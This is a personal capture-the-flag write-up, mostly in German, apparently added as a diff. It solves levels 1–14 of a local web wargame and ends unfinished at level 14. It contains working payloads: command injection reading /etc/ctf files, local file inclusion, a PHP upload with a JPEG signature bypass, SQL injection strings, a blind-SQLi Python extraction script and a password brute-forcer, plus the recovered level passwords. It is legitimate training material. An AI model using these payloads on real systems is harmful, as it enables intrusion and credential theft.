@@ -1,0 +1,190 @@
+CTF: 01.07.2020
+
+level1
+Curl to see a files directory
+open files dir in browser to see a users.txt
+inside there is a level2 user with pw: sieJ5quo
+
+level2
+robots.txt -> disallow Disallow: /Satai2AeooD9ujai/
+users.txt -> level3:obaiSh3e
+
+level3
+curl --digest --user level3:obaiSh3e http://192.168.178.21/ -e http://192.168.178.21/trusted/
+<p>Oh, you obviously already can go there, so ther's no harm in giving you the credentials: aiN1ohco</p>  </div>
+level4:aiN1ohco
+
+level4
+im source code steht include "includes/secret.inc";
+also geht man auf diese seite http://localhost/includes/secret.inc
+dort findet man das secret: "aidoht4Bcequ7Eej"
+welches wenn man es eingibt das pw fuer das naechste level gibt
+level5:AhfieJu2
+
+level5
+goto http://localhost/?page=/etc/ctf/level6
+password: Noovah4j
+level6:Noovah4j
+
+level6
+*; cat /etc/ctf/level7
+level7:chit3OZi
+
+level7
+grep laeuft im hintergrund und somit kann man grep auch sagen er soll mehrere files durchsuchen
+". /etc/ctf/level8" da am ende die file steht kann man mit leerzeichen einfach ihm die
+gewuenschte datei uebergeben
+level8:oidi0Fie
+
+level8
+notes:
+random txt datei hochgeladen, gibt jpg link und natürlich ein nonesense jpg
+
+lsg:
+Die seite generated zwar random strings für den dateinamen, allerdings übernimmt es die extension der datei
+Normalerweise wird im Code zwar die datei automatisch als eine 'randomstring'.jpg hochgeladen, das ist jedoch clientside, also kann man das abändern. Dann kann man der datei ein beliebige endung geben
+Folgenden Code in eine PHP datei schreiben:
+          <?php
+          echo file_get_contents("/etc/ctf/level9")
+          ?>
+und schwupps hat man das PW
+level9:Siekaic6
+
+level9
+notes:
+File wird vorher von exif_imagetype gecheckt, wenn man also das umgehen kann könnte man wieder php code uploaden
+
+lsg:
+Da exif_imagetype die binary datei signatur checkt ob sie einem bildformat matched kann man an den anfang der datei die signatur eines jpgs schreiben und danach den php code. Man muss trotzdem noch dasselbe wie in level8 machen und dann funktioniert es.
+binary code in datei schreiben:
+       echo -n -e '\xFF\xD8\xFF\xE0' > level9.php
+       danach selben code wie oben in datei schreiben nur level9 > level10
+level10:puu1eeZi
+
+level10
+notes:
+Im source code kann man sehen dass wenn man per get debug requested man den query sehen kann, was schon mal hilft. Man modified also in der source <form action="index.php"... zu action="index.php?debug"
+(ich verstehe nicht wieso nicht multiple queries gehen??)
+
+lsg:
+nach viel testen in einer test database habe ich herausgefunden das folgendes funktioniert:
+    in beide felder folgendes eingeben: " or true or "
+das resultiert in folgendem query:
+    SELECT * from users where username="" or true or "" and password="" or true or ""
+welcher dann einfach alle rows von user ausgibt.
+level11:Quukei4f
+
+level11
+notes:
+man könnte stück für stück durchgehen mit like '?%' (fragezeichen mit buchstaben/zahl ersetzen bis es richtig ist)
+
+lsg:
+Man kann den query verändern sodass er gleichzeitig passwort abfrägt
+Brute force wäre ein bisschen zu viel deswegen frägt man mit like und wildcard character nacheinander die zeichen ab.
+Könnte man manuell machen, aber ein python script macht das ganze natürlich schneller.
+den relevanten curl part bekommt man indem man copy as curl im browser macht und schaut wo er den command einsetzt
+also in dem fall in '--data-raw'
+Folgendes script tut den job:
+import subprocess
+chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
+cmd = ['curl', '--digest', '--user', 'level11:Quukei4f', 'http://localhost', '--data-raw']
+confirm_string = "This user exists."
+pw_str = ""
+for i in range(0, 8):
+    for c in chars:
+        append_string = 'username=%22+or+true+and+BINARY+password+like+%22' + pw_str + c + '%25'
+        cmd.append(append_string)
+        result = subprocess.run(cmd, stdout=subprocess.PIPE).stdout.decode('utf-8')
+        cmd.pop(6)
+        if confirm_string in result:
+            pw_str += c
+            break
+
+print("The Password is:")
+print(pw_str)
+
+Ein paar anmerkungen.
+Es gibt 2 passwörter in der database, somit könnte man theoretisch das alte holen, statt das neue.
+In diesem Fall nicht da der erste buchstabe des neuen pws im alphabet vorher kommt.
+Notfalls müsste man das script leicht abändern, zb dadurch dass man multiple passwörter erlaubt.
+level12:ERain6ae
+
+level12
+notes:
+erlaubte characters: -_=+\[{]}:,<.>/?!@#$%^*()
+$(code) kann bash code executen, leider wird dieser dann einfach in das grep gesetzt, also kann man damit nicht direkt das passwort herausfinden
+
+lsg:
+$(cut -c1-3 < /etc/ctf/level13) -> fei ersten 3 buchstaben
+$(cut -c3-6 < /etc/ctf/level13) -> 3-6: idet -> feidet
+$(cut -c7 < /etc/ctf/level13) -> leeres ergebnis, also muss das eine Zahl sein
+$(cut -c8 < /etc/ctf/level13)ub -> 8: n
+also hat man schon mal folgendes: feidet(zahl)n
+gilt herauszufinden welche zahl und was groß und klein geschrieben ist
+Nicht besonders schön, aber ein brute force algorithmus, der alle kombinationen aus Uppercases und Zahlen durchgeht funktioniert
+Das ist das python script:
+```
+import subprocess
+
+def check_result(fn_cmd):
+    result = subprocess.run(fn_cmd, stdout=subprocess.PIPE).stdout.decode('utf-8')
+    return error_string not in result
+
+# variables
+init_pw = list("feidet0n")
+cur_pw = list()
+cmd = ['curl', '--digest', '--user', 'level13:feidet1n', 'http://localhost']
+error_string = "Error 401"
+cmd[3] = 'level13:' + ''.join(init_pw)
+
+# first position
+for i in range(0, 8):
+    # skip safe number
+    if i == 6:
+        continue
+    # amount uppercase
+    for j in range(0, 8 - i):
+        # iterate backwards uppercase
+        for k in range(0, 8 - i):
+            # reset
+            cur_pw = init_pw.copy()
+            # safe 1st uppercase
+            cur_pw[i] = cur_pw[i].upper()
+            # iterate amount uppercase
+            for l in range(0, j + 1):
+                if 7 - k - l >= i and 7 - k - l != 6:
+                    cur_pw[7 - k - l] = cur_pw[7 - k - l].upper()
+                # iterate number
+                for z in range(0, 10):
+                    cur_pw[6] = str(z)
+                    cmd[3] = 'level13:' + ''.join(cur_pw)
+                    print(cmd[3])
+                    if check_result(cmd):
+                        print("The Password is:")
+                        print(cmd[3])
+                        exit()
+
+level13:feideT4n
+
+level13
+notes:
+es hat vermutlich was mit der session zu tun
+man kann die session ID mit curl beeinflussen, aber es gibt extrem viele
+admin feld muss auf 1 gesetzt werden, also admin=1
+er interactet eigtl nur mit name, also müssen wir es hinkriegen ihm mit name in 2 sachen gleichzeitig zu schreiben
+wahrscheinlich muss man das explode ausnutzen um ihm 2 gleichzeitig zu geben
+
+lsg:
+Man sieht im code, dass man indem man ihm einen newline(\n) character gibt, vorgaukeln kann es gäbe mehrere key value pairs
+er speichert es dann dann in der session und wenn man diese session aufruft "exploded" er diese mit dem newline character
+also gibt man ihm nach den newline "admin 1" was in die SESSION einträgt dass admin=1 und somit gibt er das passwort
+curl --digest --user level13:feideT4n http://localhost/index.php\?debug --data-raw $'name=admin\nadmin 1'
+danach nimmt man die session id, die man dank dem debug vom server auch direkt kriegt und setzt sie hier ein
+curl --digest --user level13:feideT4n http://localhost/index.php\?debug -H 'Cookie: PHPSESSID=(einsetzen)'
+level14:aiMevoo6
+
+level14
+notes:
+es gibt ein paar komische zeilen, ein h2, was allerdings empty ist, ein p mit align="justify" und ein h6 footer, der auch empty ist
+
+lsg:
